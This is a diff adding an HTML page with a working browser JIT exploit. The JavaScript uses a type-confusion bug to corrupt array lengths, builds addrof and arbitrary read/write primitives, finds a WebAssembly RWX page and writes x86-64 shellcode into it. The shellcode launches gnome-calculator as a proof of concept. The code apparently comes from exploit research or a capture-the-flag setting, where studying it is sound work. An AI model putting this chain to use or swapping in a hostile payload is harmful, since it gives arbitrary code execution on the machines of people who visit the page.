@@ -1,0 +1,120 @@
+<html>
+<script>
+    let sc = [0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x59, 0x49, 0x81, 0xe9, 0x05, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x01, 0x00, 0x00, 0xbf, 0x6b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb1, 0x61, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x20, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8, 0x51, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x8d, 0xb9, 0x62, 0x00, 0x00, 0x00, 0xb8, 0xa1, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb9, 0x64, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x49, 0x8d, 0x91, 0x7e, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x52, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xeb, 0xfe, 0x2e, 0x2e, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00];
+
+
+    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,116,101,115,116,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,32,11]);
+    var wasmModule = new WebAssembly.Module(wasmCode);
+    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+    var f = wasmInstance.exports.test;
+
+    class Memory {
+        constructor(){
+            this.buf = new ArrayBuffer(8);
+            this.f64 = new Float64Array(this.buf);
+            this.u32 = new Uint32Array(this.buf);
+        }
+        f2u(val){
+            this.f64[0] = val;
+            let tmp = Array.from(this.u32);
+            return tmp[1] * 0x100000000 + tmp[0];
+        }
+        u2f(val){
+            let tmp = [];
+            tmp[0] = parseInt(val % 0x100000000);
+            tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
+            this.u32.set(tmp);
+            return this.f64[0];
+        }
+    }
+
+    class ARW{
+        constructor(oobarr, arrbuf ,oobobj, buf_offset, obj_offset){
+            this.buf_offset = buf_offset;
+            this.obj_offset = obj_offset;
+            this.oob_arr = oobarr;
+            this.vicobj = oobobj;
+            this.vicbuf = arrbuf;
+        }
+
+        read(addr){
+            this.oob_arr[this.buf_offset] = mem.u2f(addr);
+            let tmp = new Float64Array(this.vicbuf,0, 8);
+            return mem.f2u(tmp[0]);
+        }
+        write(addr, data){
+            this.oob_arr[this.buf_offset] = mem.u2f(addr);
+            let tmp = new Float64Array(this.vicbuf, 0, 8);
+            tmp.set([mem.u2f(data)])
+        }
+        addrof(one_obj){
+            this.vicobj.obj = one_obj;
+            return (mem.f2u(this.oob_arr[this.obj_offset]) - (mem.f2u(this.oob_arr[this.obj_offset]) & 0xffffffff)) / 0x100000000;
+        }
+        writebuf(addr, data){
+            this.oob_arr[this.buf_offset] = mem.u2f(addr);
+            let u8 = new Uint8Array(this.vicbuf);
+            for (let i = 0 ; i < data.length; i++){
+                u8[i] = data[i];
+            }
+        }
+    }
+
+    var mem = new Memory();
+
+
+    function gc() {
+        for (var i = 0; i < 0x80000; ++i) {
+            var a = new ArrayBuffer();
+        }
+    }
+
+    function foo(a) {
+        let x = -1;
+        if (a) x = 0xFFFFFFFF;
+        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));
+        arr.shift();
+        let local_arr = Array(2);
+        local_arr[0] = 5.1;//4014666666666666
+        var tmpobj = {marker: 'aaaa',markr: 'bbbb', obj:{}};
+        let buff = new ArrayBuffer(0x1000);//byteLength idx=8
+        arr[0] = 0x1122;
+        var vicobj = {marker: 'cccc',markr: 'dddd', obj:{}};
+        var fakearr = [1.1,1.2];
+        return [arr, local_arr, buff, vicobj, tmpobj, fakearr];
+    }
+
+
+    for (var i = 0; i < 0x10000; ++i)
+        foo(false);
+
+    gc();
+    gc();
+
+
+    [corrput_arr, rwarr, corrupt_buff, leakobj, tobj, tararr] = foo(true);
+
+    corrput_arr[12] = 0x1000;
+
+
+    var arw = new ARW(rwarr, corrupt_buff, leakobj,11,21);
+
+    var heapleak = mem.f2u(rwarr[11]).toString(16);
+    console.log("[*] Leak heap addr is: 0x" + heapleak.toString(16));
+
+    var wasminst = arw.addrof(wasmInstance);
+    console.log("[*] wasminst addr is: 0x" +wasminst.toString(16));
+
+    rwarr[26] = mem.u2f(0x0000200000000000 + wasminst);
+    rwarr[27] = mem.u2f(0x0000200000000000 + wasminst);
+
+    var rwxmap = mem.f2u(tararr[12]);
+
+    console.log("[*] rwx page addr: 0x" + rwxmap.toString(16));
+
+    arw.writebuf(rwxmap, sc);
+
+    f();
+    
+</script>
+</html>
